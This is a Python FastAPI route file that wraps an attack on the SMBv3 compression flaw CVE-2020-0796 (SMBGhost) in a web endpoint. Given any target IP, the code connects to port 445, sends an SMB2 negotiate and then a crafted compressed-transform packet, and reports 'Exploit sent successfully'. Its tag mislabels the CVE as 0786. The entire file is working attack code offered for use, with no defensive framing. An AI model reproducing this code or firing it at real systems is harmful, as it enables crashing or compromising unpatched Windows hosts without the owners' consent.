from fastapi import APIRouter, HTTPException
import socket
from ..models.smb import Smb2NegotiateRequest, NetBIOSWrapper, Smb2CompressedTransformHeader

router = APIRouter()

tags_cve_2020_0786 = "cve-2020-0786"

    
@router.get("/api/exploit-cve-2020-0796", tags=[tags_cve_2020_0786])
async def exploit_smb(target_ip: str):
    try:
        sock = socket.socket(socket.AF_INET)
        sock.settimeout(3)
        sock.connect((target_ip, 445))
        
        negotiate = Smb2NegotiateRequest()
        packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
        sock.send(packet.encode('latin1'))
        sock.recv(3000)
        
        send_compressed(sock, "JST" * 100)  # Gửi dữ liệu nén
        
        return {"Trạng thái": "Exploit sent successfully"}
    except socket.timeout:
        raise HTTPException(status_code=408, detail="Socket timeout occurred")
    except socket.error as e:
        raise HTTPException(status_code=500, detail=f"Socket error: {str(e)}")

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest()
    packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    sock.recv(3000)

def send_compressed(sock, data):
    compressed = Smb2CompressedTransformHeader(data)
    packet = NetBIOSWrapper(compressed.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    sock.recv(1000)